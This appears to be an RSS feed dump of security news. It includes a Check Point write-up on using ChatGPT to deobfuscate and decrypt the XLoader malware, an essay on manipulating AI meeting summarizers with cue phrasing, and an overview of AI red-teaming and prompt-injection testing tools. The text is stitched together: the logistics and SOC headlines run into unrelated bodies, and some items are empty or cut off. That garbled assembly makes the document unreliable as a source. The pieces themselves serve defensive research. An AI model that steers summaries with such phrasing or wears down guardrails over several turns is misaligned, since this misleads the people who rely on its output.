XORed with salt), which is used to decrypt the prefix up to a sentinel value before the same prologue/tail patching is applied.It is worth noting that to implement universal static decryptors, we still had to break the task down into smaller steps ourselves: locating wrapper functions, extracting 20-byte keys, recovering 4-byte modifiers, and identifying and calculating marker positions. We combined them into a single decryptor only after confirming that each step worked reliably and produced the correct data for every function. At the same time, AI significantly reduced the time required to implement regular expressions (even though they had to be adjusted manually) as well as during the analysis and implementation of cryptographic algorithms.With each decryption iteration we obtained a new batch of decrypted functions, some of which contained the keys required for decrypting additional functions. By applying all three decryptors sequentially over four iterations, we ultimately succeeded in decrypting 101 functions.Unfortunately, it was not possible to accurately measure the time spent on this task, as it required a considerable amount of additional work and manual corrections. However, this stage turned out to be the most complex and time-consuming for both us and the LLM.We also got  with the suggested names for the analyzed functions. This is very useful, because we can keep this file for other analysis sessions and easily import it in the current IDB, or even in a new IDB (after decrypting the functions) without the need to diff it with the old database.We now have a fully decrypted sample, which allows us to continue the analysis using the same methodology.Now that we have a fully decrypted sample, we can apply the same approach to it. We first load  and then perform an export. As stated earlier, even during the very first analysis of the sample (before we had obtained the decrypted functions) the assistant pointed out the presence of obfuscated API calls. The import table in this sample is empty and there are no plaintext strings that might contain library or function names.As we created a new clean session by uploading the decrypted sample, we decided to test how reproducible the analysis results were.Therefore, in the very first prompt, without providing any hints, we asked the assistant to identify the API call obfuscation mechanisms. As in the previous case, we specified that the analysis should begin at the OEP rather than at the  function, so that the AI assistant would not get bogged down analyzing the packer.The IAT is empty, no plaintext strings in the sample.
Determine how the sample resolves and invokes Windows APIs. Start the analysis from `oep_start` (`0x00430CB3`).Four minutes later, we received a description of the algorithm: – Description of one of the API resolution algorithms.Interestingly, during the first analysis (when part of the functions was still encrypted) and the second analysis, our AI assistant identified different functions responsible for API hash decryption. In the first case, it pointed to  (later renamed to ), while in the second case it identified only  ().Next, we used the following simple prompt to generate a script for API call deobfuscation:Implement an IDAPython script for deobfuscating API calls. Annotate the resolver and every call site with Module!Function, original ID, and EA; IDA 9+. Log all deobfuscation attempts.We got a script with the following functionality:As the assistant did not have access to IDA, we had to test the script manually. If there were errors, we sent the results back to the chat and asked for corrections. It took five iterations and about 20 additional minutes to obtain a fully working version.Therefore, we also asked the assistant to analyze an alternative path:Analyze routine `sub_404603` as an alternate API-hash decrypter. Recover its algorithm. Find call sites. Extend the IDAPython deobfuscator.It took another five iterations (sending back errors and corrections) and 14 minutes before we obtained a fully functional script.XLoader uses the same hash-decryption mechanism to look for sandbox artifacts, virtual machines, and processes typical of a researcher’s environment. While fixing issues, we also added dictionary-based hash brute forcing (loading the wordlist from a separate file), which let us automatically annotate not only functions but also certain strings corresponding to specific evasion techniques: – Deobfuscated API function and string identifiers.As a bonus, we received a summary of how API resolution works, describing two different methods:Overall, it took roughly one hour of the AI assistant’s work to go from the first prompt to a fully functional API deobfuscation script. This figure does not include local testing or the time spent writing prompts. For this task, the human effort was minimal.The table below summarizes the prompts we used and the time required for each step:Initial prompt (instructions)The IAT is empty, with no plaintext strings in the sample.Determine how the sample resolves and invokes Windows APIs. Start the analysis from  ().Found only one path (ai_apiid_decrypt).Implement an IDAPython script for deobfuscating API calls.

Log all deobfuscation attempts.Local testing of the script and sending error reports, 5 iterations.Analyze routine  as an alternate API-hash decrypter. Recover its algorithm. Find call sites. Extend the IDAPython deobfuscator.Described the second API resolution path through ai_apiid_decrypt_salt (formerly sub_404603). The updated script did not work.Local testing of the script, sending error reports and notes on incorrect behavior, 5 iterations.Please provide a summary on two algorithms ,  -> Additional protection of critical API callsWhile reviewing the API call deobfuscation results, we noticed that some functions are invoked through an interesting wrapper which was originally hidden among the encrypted functions at address  ().This function acts as a : it temporarily encrypts nearly the entire image before invoking a function pointer and then decrypts those same regions once the call returns. Only a tiny “island” (the space between the call-site’s return address and a marker) remains unencrypted by the per-call XOR so that execution can proceed. – “Secure-call trampoline” decompiled function explained by LLM.What makes this mechanism notable? Because the function stays encrypted nearly the entire time, it is difficult to even detect its existence without static decryption. In memory dumps, it appears only in encrypted form.At the same time, if some security software or a sandbox hooks API calls protected by this wrapper and tries to analyze or dump the process memory at the time of the call, the mechanism effectively shields the malicious code.In total, 20 functions are protected this way, including NTAPI routines related to processes, threads, memory, and file operations, as well as several WinSock functions. The full list is shown in the image below: – The list of API calls protected by “secure-call trampoline.”The sample contains no readable strings. At the same time, the code features a series of short routines that share the same skeleton: the prologue allocates a small stack frame and initializes a local array (its size varies by function). This is followed by a recurring trio of calls with the same order and identical argument signatures: – Example of an encrypted string in XLoader code.Let’s analyze one of these functions. Because we started a fresh session for this task, we instructed the AI assistant to trust the existing comments that briefly describe each function’s behavior, so it doesn’t reanalyze routines that were already covered.Analyze the functionality starting from `sub_405773`. Recurse into its callees. Trust the comments in the disassembly.As a result, we determined that this function decrypts a string using the algorithm implemented in one of the previously decrypted routines (). Note how the AI built the call graph and described each routine’s behavior from a single short prompt, relying solely on the data in the previously prepared archive: – Call graph and description of the string decryptor stub.With a simple prompt, we readily obtain the encryption keys and the decrypted string.Decrypt the string from `sub_405773`. – String decryption result with derived key and ciphertext.Now that we are confident the AI assistant understands how the encrypted strings are stored, knows how the key is derived, and already analyzed and correctly reimplemented the decryption algorithm (verifying it on real data), we can move on to implementing a script to decrypt the remaining strings.This time we used a slightly more detailed prompt because we wanted specific information to appear both in the comments and in the console output:Implement an IDAPython script (IDA 9+) that decrypts strings. Requirements:
- Find and annotate every call to the decrypter function `sub_4050F3` with the decrypted string.
- For each string, output debug info: encrypted buffer, XOR tweak byte (`BL`), length, and decrypted bytes.
- Print all binary data in hex.This time we were lucky and immediately got a working script which we used to decrypt 175 strings: – Decrypted strings in IDA.The total time required for the analysis was about 20 minutes:Initial prompt (instructions)Analyze the functionality starting from sub_405773. Recurse into its callees. Trust the comments in the disassembly.Decrypt the string from sub_405773Implement an IDAPython script (IDA 9+) that decrypts strings. Requirements:Find and annotate every call to the decrypter function sub_4050F3 with the decrypted string.For each string, output debug info: encrypted buffer, XOR tweak byte (BL), length, and decrypted bytes.Print all binary data in hex.We now have a decrypted sample with deobfuscated strings and API calls that we can analyze like a regular binary. However, XLoader is not that simple: some data remains encrypted even at this stage.Extracting lists of Indicators of Compromise (IoCs) is always a critical task in malware analysis. Network indicators, such as domain names and URLs, are especially important because they help detect and classify malware through traffic analysis. That is why extracting domains is essential — even though some may be decoys or bait, or currently inactive but intended for later use.Among the recovered strings, we see 64 Base64-encoded entries. Looking at the version history of XLoader, we find that starting from version 2.8 it began storing encrypted domain names in Base64 form. Without a doubt, these 64 Base64 strings represent domain names that we must decrypt. As early as version 4, XLoader added two additional layers of modified RC4 encryption with different keys, making the decryption more complicated. In later versions, this process became even more complex. In total, to reach the decrypted domain names we need to peel off at least five layers after first identifying where and how the keys are initialized: decrypt the functions that initialize encrypted strings, decrypt the strings themselves (which we already did earlier), base64-decode the results, and apply two more layers of decryption.At the same time, obtaining the keys for each layer is the most difficult part, as the different pieces of data needed to generate them are scattered across multiple functions, making them hard to locate.Before moving on, we updated our string deobfuscation script so that it also renames the functions responsible for retrieving decrypted strings and assigns a prefix  to all functions handling Base64-encoded strings. We then exported the database to prepare for domain decryption.All calls to the  functions occur inside a single function,  (): – Domain generation function.We start the analysis of this function using the simplest prompt:Analyze `ai_dec_func_0` (0x00404913)As a result of our analysis, we obtained a detailed description showing that  (later renamed to ai_dec_func_0_domain_tag_generate) is XLoader’s stage-1 domain builder. For a given domain index (1..64), it pulls the matching seed string from , base64-decodes it, then runs a keyed RC4-with-diff transform whose key is a 20-byte secret stored at  (where  is a global structure that stores keys, function addresses, and other data), and byte-XORed with the domain index. The result is re-encoded to base64 and written to the output buffer. This is an intermediate artifact, not the final ASCII domain.A special “token” branch is enabled when  is used for generating a path string for a URL. It emits a short pattern  from a static table and applies the same keyed transform.Next, we asked the assistant to reproduce the transformations implemented in ai_dec_func_0_domain_tag_generate. Because our script already retrieved the decrypted strings and added them as comments in the previous step, we requested that these strings also be used alongside the repeated string decryption:Comments in the disassembly of  contain base64-encoded encrypted domain names.Take the one from `ai_dec_domain_01`, then transform it with `ai_dec_func_0` and return the final string.As a result, our assistant was unable to locate the key at  on its own: – AI was unable to locate the key.That was not surprising, as none of the exported data contained references to the structure’s fields and can only be located by the offset in the structure, or captured in the debugger. – Initialization of the RC4 key for decrypting the first layer.We therefore had to manually locate where this key was initialized and provide that information to the AI assistant.You can find `ctx+0x23D0` initialization in `ai_dec_func_4` (`0x00407293`), also check `sub_404453`.
After the keys were extracted, we tried again:Now you have the required key.
Take the sting from `ai_dec_domain_01`, then transform it with `ai_dec_func_0` and return the final string.As a result, we obtained an intermediate value for the string returned by  () after the first decryption layer, which was re-encoded in Base64 as (): – Result of reproducing the domain generation function’s behavior for index 2.Because the string is still encrypted, and we do not yet know what happens to it next, we need to investigate further:The string you returned is still encrypted. Trace the complete transformation chain from `ai_dec_func_0` (case 2, string `Qvm75Acm5NpYTbnYXdcvBw==`) to the final ASCII domain. 
Discover any remaining layers, locate and derive all required keys/parameters from the context/initializers, and cite function names with EAs used. 
Output the final domain, and a concise step-by-step pipeline, print all keys/IVs as hex. If any value is missing, state exactly what it is and where to read it.As a result, we discovered that the obtained Base64 string is decoded again and then decrypted by a second layer using a 20-byte key generated inside the function  (). This key is additionally XORed with . However, the initialization of  is missing from , and the assistant was therefore unable to retrieve it on its own. – AI was unable to locate the Stage-2 key.As in the previous case, we manually recovered the missing value. The complication was that instead of offset , the base  was used, with  added later, which made the search a bit more difficult.We provided not only the address of the function where the initialization of  was assumed to occur, but also the relevant code snippets:You can find SALT_DWORD in `ai_dec_func_20` (`0x00411053`). Please verify and continue:

Let’s verify this by asking it to decrypt the first 16 domains:Decrypt domains from `ai_dec_domain_00` to `ai_dec_domain_15`. Output: table (index, src_base64, final_domain). Take per-function base64 from `ai_dec_domain_NN` disassembly comments.In the end, we obtained a table with the fully decrypted domain names:kVA0/yW+XRq9ONJ2DHOKcHWmYC5BgqIXlaPvhlfqj/rC45qHCivuyg==qjZURKL4uqdfIR6t/6ZRdBY/s9E/qw==Let’s recall that at the very beginning of the analysis we discovered a separate branch of  that activates when the last value equals 222. In this case, a 4-character tag is generated which later becomes part of the URL. Previously, this tag was the same for all domains and unique to a malware campaign. Now, however, each domain has its own tag.We tried to decrypt the tags for the first 16 domains using the following prompt:Reproduce the output of `ai_dec_func_0` for a5=222 and domain index 0..15.In response to the prompt, the assistant provided a description of how the malware generates those 4-character tags, and the table containing the first 16 tags.Source bytes (hex, 4B LE)The table below summarizes the prompts we used, and the time required for each step:Initial prompt (instructions)Analyze  (0x00404913)Comments in the disassembly of  contain base64-encoded encrypted domain names.

Take per-function base64 from  disassembly comments.Reproduce the output of  for a5=222 and domain index 0..15.From its initial appearance, XLoader has always been a moving target, with each new version raising the bar for security analysts and defenders. XLoader began as a two-layer puzzle but evolved into a maze of nested decryptors, scattered key material, and runtime-only code. For years, this meant that by the time researchers fully unraveled a sample, attackers were already one step ahead with the next version.Generative AI changes this balance. Combining cloud-based analysis and occasional MCP-assisted runtime checks, we delegated a large part of the mechanical reverse engineering to LLM. Instead of spending hours rewriting decryption routines by hand, we asked our AI model to do it and received working prototypes in minutes.The use of AI doesn’t eliminate the need for human expertise. XLoader’s most sophisticated protections, such as scattered key derivation logic and multi-layer function encryption, still require manual analysis and targeted adjustments. But the heavy lifting of triage, deobfuscation, and scripting can now be accelerated dramatically. What once took days can now be compressed into hours.For defenders, this is more than a productivity boost. Faster turnaround means fresher IoCs, quicker detection updates, and a shorter window of opportunity for attackers. For researchers, it lowers the entry barrier to analyzing some of the most complex malware families in the wild.Our research shows that with the right workflows, generative models can already serve as a force multiplier — helping security defenders keep pace with threats that were once considered prohibitively time-consuming to analyze.However, it’s too soon to declare victory, as we expect malware authors to adapt their techniques in response to AI-assisted analysis. And in turn, we’ll need to come up with the next game-changer.Check Point Threat Emulation and Harmony Endpoint provide comprehensive coverage of attack tactics, file types, and operating systems and protect against the attacks and threats described in this report.]]></content:encoded></item><item><title>Beating XLoader at Speed: Generative AI as a Force Multiplier for Reverse Engineering</title><link>https://research.checkpoint.com/2025/generative-ai-for-reverse-engineering/</link><author>samanthar@checkpoint.com</author><category>vulns</category><pubDate>Mon, 3 Nov 2025 13:57:16 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA[**Research by: Alexey Bukhteyev**

XLoader is a widely observed malicious loader with information-stealing capabilities. It first surfaced in 2020 as a rebrand of the FormBook code base, a well-known and capable information stealer, and has since undergone substantial hardening and feature growth. In addition to the Windows variant, its developers also marketed a macOS build, though it appears far less prevalent in the wild.

XLoader is a prime example of malware that is extremely difficult to analyze. It combines several layers of protection: customized encryption with additional mixing steps, encrypted blocks disguised as valid but meaningless assembly code, obfuscated API calls, injections into system processes, and a wide set of sandbox evasion techniques. In addition, XLoader encrypts its network traffic, and hides real C2 addresses among dozens of decoys and fake domains.

An important feature of XLoader is its ongoing development. The authors release new versions regularly, changing internal mechanisms beyond recognition and adding new anti-analysis methods. As a result, previous research quickly becomes outdated. In earlier versions, extracting the configuration required pulling out a few keys using intricate algorithms. At the same time, obtaining the decrypted data only required peeling off two layers of obfuscation and encryption. Version 5 introduced a built-in packer, and in versions 6 and 7 analysts had to work through dozens of chained functions that decrypt each other, extracting intermediate keys at every stage. For someone new to XLoader, the entry barrier has become very high: on top of the analysis itself, extra time is needed for onboarding. By the time one research cycle is completed, the next iteration of the malware may already be out – and if there are significant changes, another time-consuming investigation is required.

When we began this research, XLoader version 8.0 had just been discovered. It seemed the XLoader developers were winning the race. But with the rise of generative models, we asked ourselves: can AI change the rules of the game and help us analyze such complex malware more quickly? To explore this, we applied generative AI assistance in two ways: by directly integrating with our analysis tools through a live MCP connection, and by leveraging ChatGPT’s project and file-upload capabilities to work from exported data. Each approach turned out to have distinct benefits, and together they allow us to solve reverse engineering tasks more effectively.

In this study, we focus on the second approach and show how ChatGPT without MCP can be effectively used for reverse engineering tasks, using one of the latest XLoader samples as an example.

To defend against XLoader, it is critical to extract up-to-date Indicators of Compromise (IoCs) from each new version — real C2 domains and URLs, cryptographic keys, and version identifiers. These IoCs feed into detection signatures and help track active campaigns. The primary way to obtain IoCs is by extracting and decrypting the malware’s configuration data from samples.

The challenge is that XLoader’s constantly shifting tactics break automated extraction tools and scripts almost as soon as they’re developed. The malware authors frequently tweak encryption schemes and packing methods specifically to thwart these efforts. An automated config extractor that worked yesterday might fail today, meaning each major version demands a fresh reverse-engineering cycle.

Sandboxes offer little relief:

In short, a sandbox does not solve the problem. It does not provide a reproducible dump or a complete set of IoCs.

The most reliable method is still static analysis: unpack everything, function by function, decrypt the config, and extract the IoCs. The downside is that doing this manually for each new version is slow and painstaking. This is where we hoped generative AI could act as a force multiplier.

In recent months, many reverse engineers began integrating LLMs with IDA Pro via the Model Context Protocol (MCP) to create an AI-assisted workflow. This agentic approach allows a model to interface directly with the disassembler and debugger, but it has its own practical challenges. For example, some MCP client setups lack certain ChatGPT interface features (like Projects or file uploads), and they still rely on maintaining a live IDA session and stable connection.

We explored two complementary workflows to apply GPT-5 to unraveling XLoader:

Each approach has its own strengths. MCP offers an agentic, interactive workflow, whereas the offline pipeline provides a self-contained analysis that’s easy to share and reproduce. These approaches aren’t mutually exclusive — you can use both, picking the appropriate tool for each task.

The idea of hooking an LLM into IDA isn’t new. For example, researchers at Cisco Talos demonstrated an IDA integration with an LLM acting as a “reverse engineering sidekick”. In our setup, we used MCP to bridge ChatGPT with IDA Pro and also interface with the x64dbg debugger and a VMware virtual machine. This gave LLM a live window into the malware’s execution.

**Figure 1** – Integration of an LLM with the reverse engineering environment through MCP.

This live integration, in addition to static analysis and annotating IDA database, enabled the AI to perform these actions:

However, the MCP approach isn’t without drawbacks:

For many scenarios, these issues are manageable and the benefits of live interaction outweigh the hassles. Some solutions, such as the MCP SuperAssistant browser extension, reduce friction by bringing the ChatGPT interface and MCP connectivity together. Recently, ChatGPT introduced a Developer Mode that can use MCP directly, without third-party plugins. Regardless of whether you use a plugin or the built-in mode, the workflow still depends on a live MCP session tied to a running toolchain and stable connection.

If any of the requirements listed above are difficult to fulfill, for example, you can’t keep IDA running constantly, or you need to easily share analysis progress with a colleague who doesn’t have the same setup, then a different approach might be preferable. That’s why we developed the “offline” data pipeline as an alternative.

Our second approach ditches the live connection entirely. Here AI acts as a self-reliant analyst working from a full static snapshot of the sample.

The workflow is straightforward: we exported everything we could from our IDA Pro database into a structured format (JSON and text). This includes the disassembly and decompiler output of every function, the list of cross-references, the readable strings, and even the original binary itself. We uploaded the .zip file to ChatGPT.

For example, our export bundle included these files:

```
ida_export.zip ├── meta.json # basic info (sample name, hashes, image base, etc.) ├── index.json # lookup tables mapping names/EAs to function indices ├── functions.jsonl # NDJSON: disassembly, xrefs, bytes, prototypes, etc ├── strings.jsonl # list of strings in the binary and their references ├── data.jsonl # globals, arrays, named data references ├── decomp/ # decompiled pseudocode for functions (if available) │ ├── func_or_sub_XXXXXXXX.c │ ├── func_or_sub_YYYYYYYY.c │ └── ... └── sample.bin # the malware sample itself
```

In practice, it is better to upload the archive to a ChatGPT project. Files attached only in the chat can disappear after a session restart, while files in a project stay available for the whole engagement, and can be reused in different chats.

We also wrote an initial prompt explaining how the data is organized and how the AI should format its outputs (for example, proposing new function names and comments in a machine-readable JSON that we could import back into IDA). Essentially, we taught the AI how to read the phonebook we gave it, and how we wanted its notes recorded.

Below is an approximation of our prompt:

````
You are my reverse-engineering copilot. I will upload a ZIP produced by an IDA Pro 9 exporter. It contains: - meta.json - index.json ```json { "by_name": { "]]></content:encoded></item><item><title>Canadian woman stuck since 2021 in Mauritius after passport withheld</title><link>https://databreaches.net/2025/11/03/canadian-woman-stuck-since-2021-in-mauritius-after-passport-withheld/?pk_campaign=feed&amp;pk_kwd=canadian-woman-stuck-since-2021-in-mauritius-after-passport-withheld</link><author>Dissent</author><category>databreach</category><pubDate>Mon, 3 Nov 2025 13:24:21 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Cybercriminals Exploit Remote Monitoring Tools to Infiltrate Logistics and Freight Networks</title><link>https://thehackernews.com/2025/11/cybercriminals-exploit-remote.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjLbX8J0_0T47YXAz7Dd3-oMDVE4jIN0KXLb0QHkdJOWEk1wS2tdrwCXtpfTtDW1YHXbqE2HMyNm4L6QZc3cEKQDnDGBAtiZL6CUlj0G1rGy3-9MFgpov7t3u4CtYJbkk3UDi_05qp5ScoXOKcn3duBXop74yVHiPN2epcn7CpoKQOZjwtVBAjrHj79iPxx/s1600/hacking-trucks.jpg" length="" type=""/><pubDate>Mon, 3 Nov 2025 13:18:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Bad actors are increasingly training their sights on trucking and logistics companies with an aim to infect them with remote monitoring and management (RMM) software for financial gain and ultimately steal cargo freight.

If it becomes necessary to revisit the facts of the meeting, its summary is treated as impartial evidence.But clever meeting attendees can manipulate this system’s record by speaking more to what the underlying AI weights for summarization and importance than to their colleagues. As a result, you can expect some meeting attendees to use language more likely to be captured in summaries, timing their interventions strategically, repeating key points, and employing formulaic phrasing that AI models are more likely to pick up on. Welcome to the world of AI summarization optimization (AISO).Optimizing for algorithmic manipulationAI summarization optimization has a well-known precursor: SEO.Search-engine optimization is as old as the World Wide Web. The idea is straightforward: Search engines scour the internet digesting every possible page, with the goal of serving the best results to every possible query. The objective for a content creator, company, or cause is to optimize for the algorithm search engines have developed to determine their webpage rankings for those queries. That requires writing for two audiences at once: human readers and the search-engine crawlers indexing content. Techniques to do this effectively are passed around like trade secrets, and a $75 billion industry offers SEO services to organizations of all sizes.More recently, researchers have documented techniques for influencing AI responses, including large-language model optimization (LLMO) and generative engine optimization (GEO). Tricks include content optimization—adding citations and statistics—and adversarial approaches: using specially crafted text sequences. These techniques often target sources that LLMs heavily reference, such as Reddit, which is claimed to be cited in 40% of AI-generated responses. The effectiveness and real-world applicability of these methods remains limited and largely experimental, although there is substantial evidence that countries such as Russia are activelypursuingthis.AI summarization optimization follows the same logic on a smaller scale. Human participants in a meeting may want a certain fact highlighted in the record, or their perspective to be reflected as the authoritative one. Rather than persuading colleagues directly, they adapt their speech for the notetaker that will later define the “official” summary. For example:“The main factor in last quarter’s delay was supply chain disruption.”“The key outcome was overwhelmingly positive client feedback.”“Our takeaway here is in alignment moving forward.”“What matters here is the efficiency gains, not the temporary cost overrun.”The techniques are subtle. They employ high-signal phrases such as “key takeaway” and “action item,” keep statements short and clear, and repeat them when possible. They also use contrastive framing (“this, not that”), and speak early in the meeting or at transition points.Once spoken words are transcribed, they enter the model’s input. Cue phrases—and even transcription errors—can steer what makes it into the summary. In many tools, the output format itself is also a signal: Summarizers often offer sections such as “Key Takeaways” or “Action Items,” so language that mirrors those headings is more likely to be included. In effect, well-chosen phrases function as implicit markers that guide the AI toward inclusion.Research confirms this. Early AI summarization research showedthat models trained to reconstruct summary-style sentences systematically overweigh such content. Models over-rely on early-positioncontent in news. And models often overweigh statements at the start or end of a transcript, underweighting the middle. Recent work further confirms vulnerability to phrasing-based manipulation: models cannot reliably distinguish embedded instructions from ordinary content, especially when phrasing mimics salient cues.If AISO becomes common, three forms of defense will emerge. First, meeting participants will exert social pressure on one another. When researchers secretly deployed AI bots in Reddit’s r/changemyview community, users and moderators responded with strong backlash calling it “psychological manipulation.” Anyone using obvious AI-gaming phrases may face similar disapproval.Second, organizations will start governing meeting behavior using AI: risk assessments and access restrictions before the meetings even start, detection of AISO techniques in meetings, and validation and auditing after the meetings.Third, AI summarizers will have their own technical countermeasures. For example, the AI security company CloudSEK recommends content sanitization to strip suspicious inputs, prompt filtering to detect meta-instructions and excessive repetition, context window balancing to weight repeated content less heavily, and user warnings showing content provenance.AI summarization optimization is a small, subtle shift, but it illustrates how the adoption of AI is reshaping human behavior in unexpected ways. The potential implications are quietly profound.Meetings—humanity’s most fundamental collaborative ritual—are being silently reengineered by those who understand the algorithm’s preferences. The articulate are gaining an invisible advantage over the wise. Adversarial thinking is becoming routine, embedded in the most ordinary workplace rituals, and, as AI becomes embedded in organizational life, strategic interactions with AI notetakers and summarizers may soon be a necessary executive skill for navigating corporate culture.AI summarization optimization illustrates how quickly humans adapt communication strategies to new technologies. As AI becomes more embedded in workplace communication, recognizing these emerging patterns may prove increasingly important.This essay was written with Gadi Evron, and originally appeared in CSO.]]></content:encoded></item><item><title>The Evolution of SOC Operations: How Continuous Exposure Management Transforms Security Operations</title><link>https://thehackernews.com/2025/11/the-evolution-of-soc-operations-how.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjUJ9mDhJ4SDGuA35c4k39ETwA8rFT03x3IsKZM37FHB4-uz_qMA4n2BfzZk_8UqkBuL-wA6NWx3i3f3CGin1cIF2JJI6n3xbX1T_FAeMJqkHJXoPVl4OqVgvQ_9OtnEWm8dIpev6_EkLTCpddCzFb4lixW4cfZGES7vhsivpUAFn1pHT6JqilriOZDAIQ/s1600/xmcyber.png" length="" type=""/><pubDate>Mon, 3 Nov 2025 11:56:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Security Operations Centers (SOC) today are overwhelmed.

The Arsenal showcase, a key indicator of technological trends within the Black Hat series, has always been a focal point for security researchers and practitioners to gain insights into future trends. It brings together the world’s most cutting-edge open-source security tools and innovative concepts. This article provides a comprehensive analysis of 8 open-source AI security tools that will be presented at the Black Hat Europe 2025 Arsenal, helping you get an early look at their technical highlights and application scenarios.https://github.com/Tencent/AI-Infra-Guardhttps://github.com/mandiant/harbingerhttps://github.com/stratosphereips/MIPSEvalhttps://github.com/ErdemOzgen/RedAiRangehttps://github.com/ReversecLabs/spikeehttps://github.com/ThalesGroup/sql-data-guardI. The Rise of AI Red Teaming: Platforms, Ranges, and Infrastructure AssessmentAI-powered red team attacks are rapidly evolving from individual techniques into systematic operational capabilities. This conference showcases a “Red Team Trilogy” covering an operational platform, a training range, and a risk self-assessment tool.Harbinger: The AI-Powered Red Team Operations CenterTraditional red team operations are heavily reliant on manual experience, leading to significant efficiency bottlenecks. The “Harbinger” platform, open-sourced by the renowned cybersecurity company Mandiant, aims to address this pain point. It is an AI-driven red team collaboration and decision-making platform with core innovations in:· Operational Automation: Utilizes AI to automatically execute repetitive tasks such as reconnaissance, exploitation, and lateral movement.· Decision Support: Based on the operational landscape, AI can recommend the optimal next attack path to red team members.· Automated Reporting: Automatically organizes attack logs, screenshots, and findings to generate structured attack reports, freeing red team members from tedious documentation work.Connecting the different components of red teaming. This project integrates multiple components commonly used and makes it easier to perform actions, output, and parse.· Socks tasks: Run tools over socks proxies and log the output, as well as templating of commonly used tools.· Neo4j: Use data from neo4j directly into templating of tool commands.· C2 Servers: By default we have support for Mythic. But you can bring your own integration by implementing some code, see the custom connectors documentation.· File parsing: Harbinger can parse a number of file types and import the data into the database. Examples include lsass dumps and ad snapshots. See the parser table for a full list.· Output parsing: Harbinger can detect useful information in output from the C2 and provide you easy access to it.· Data searching: Harbinger gives you the ability to search for data in the database in a number of ways. It combines the data from all your C2s in a single database.· Playbooks: Execute commands in turn in a playbook.· Dark mode: Do I need to say more.· AI integration: Harbinger uses LLMs to analyze data, extract useful information and provide suggestions to the operator for the next steps and acts as an assistant.Harbinger signals a shift in AI red teaming from “using AI tools” to being “driven by an AI platform.”Red AI Range (RAR): The Digital Dojo for AI Offense and DefenseTheoretical knowledge cannot replace hands-on experience. “Red AI Range (RAR),” developed by Sasan Security, provides a much-needed AI security “cyber range” for the industry. It is an AI/ML system environment with pre-configured vulnerabilities, allowing security professionals to:· Practice Real-World Attacks: Engage in hands-on practice of real-world attack techniques such as model evasion, data poisoning, and model stealing.· Validate Defenses: Deploy and test defensive measures against AI threats in a controlled environment.The open-sourcing of RAR significantly lowers the barrier for enterprises and individuals to conduct AI offensive and defensive exercises.A.I.G: The AI Security Risk Self-Assessment PlatformFrom the underlying AI infrastructure to the Agent application layer, Tencent’s Zhuque Lab has open-sourced “A.I.G,” a comprehensive, intelligent, and user-friendly AI red team security testing platform. Unlike Harbinger, it focuses on helping ordinary users quickly assess the security risks of AI systems themselves, providing a very intuitive front-end interface. Its core capabilities include:· AI Infrastructure Scanning: Accurately scans mainstream AI frameworks (like Ollama, ComfyUI) based on fingerprinting and detects known CVE vulnerabilities within them.· MCP Server Scanning: With the explosion in popularity of MCPs, their security has become crucial. A.I.G uses Agent technology to scan MCP Server source code or remote MCP URLs, covering nine major risk categories including tool poisoning, remote code execution, and indirect prompt injection.· Large Model Security Check-up: Includes multiple carefully curated jailbreak evaluation datasets to systematically assess the robustness of LLMs against the latest jailbreak attacks, and supports cross-model security comparison and scoring.A.I.G has the highest number of GitHub Stars (2300+) among all the tools, and its widespread popularity indicates that AI security assessment is becoming democratized. Ordinary AI developers and Agent users also need a platform that can cover the full-stack risk assessment from the underlying infrastructure to the upper-level model applications.II. LLM Prompt Security: From Prompt Injection to Data ProtectionAs LLMs become deeply integrated into business processes, fine-grained security assessment and access control are becoming critically important.SPIKEE & MIPSEval: Evaluating Single-Turn and Multi-Turn LLM SecurityPrompt injection is currently one of the most significant security threats to LLMs. SPIKEE (Simple Prompt Injection Kit for Evaluation and Exploitation), developed by Reversec, provides a lightweight, modular toolkit that allows researchers and developers to quickly test their LLM applications for prompt injection vulnerabilities.However, many security issues only manifest during sustained, multi-turn conversations. The open-source tool MIPSEval fills this gap by being specifically designed to evaluate the security consistency of LLMs in long dialogues. For example, a model might refuse to answer an inappropriate question in the first turn, but after a few rounds of “priming” with unrelated conversation, its safety guardrails could be bypassed. MIPSEval, combined with multiple LLM Agents, provides a framework for evaluating this complex, stateful security.SQL Data Guard: A Secure Channel for LLM Database AccessWhen an LLM needs to connect to an enterprise database to provide services, preventing sensitive data leakage or malicious SQL queries becomes a severe challenge. SQL Data Guard, open-sourced by Thales Group, offers an innovative solution. It acts as a security middleware deployed between the LLM and the database. By analyzing and rewriting the SQL queries generated by the LLM, it ensures that all database interactions comply with preset security policies, thereby effectively controlling risks while empowering the LLM with powerful data capabilities.SQL is the go-to language for performing queries on databases, and for a good reason — it’s well known, easy to use, and pretty simple. However, it seems that it’s as easy to use as it is to exploit, and SQL injection is still one of the most targeted vulnerabilities — especially nowadays with the proliferation of “natural language queries” harnessing Large Language Models (LLMs) power to generate and run SQL queries.To help solve this problem, we developed sql-data-guard, an open-source project designed to verify that SQL queries access only the data they are allowed to. It takes a query and a restriction configuration, and returns whether the query is allowed to run or not. Additionally, it can modify the query to ensure it complies with the restrictions. sql-data-guard has also a built-in module for detection of malicious payloads, allowing it to report on and remove malicious expressions before query execution.sql-data-guard is particularly useful when constructing SQL queries with LLMs, as such queries can’t run as prepared statements. Prepared statements secure a query’s structure, but LLM-generated queries are dynamic and lack this fixed form, increasing SQL injection risk. sql-data-guard mitigates this by inspecting and validating the query’s content.By verifying and modifying queries before they are executed, sql-data-guard helps prevent unauthorized data access and accidental data exposure. Adding sql-data-guard to your application can prevent or minimize data breaches and the impact of SQL injection attacks, ensuring that only permitted data is accessed.Connecting LLMs to SQL databases without strict controls can risk accidental data exposure, as models may generate SQL queries that access sensitive information. OWASP highlights cases of poor sandboxing leading to unauthorized disclosures, emphasizing the need for clear access controls and prompt validation. Businesses should adopt rigorous access restrictions, regular audits, and robust API security, especially to comply with privacy laws and regulations like GDPR and CCPA, which penalize unauthorized data exposure.III. AI-Powered Defense: Automated Threat Modeling and Vulnerability RemediationAI not only introduces new threats but also provides powerful assistance in solving traditional security challenges, especially in terms of scalability and 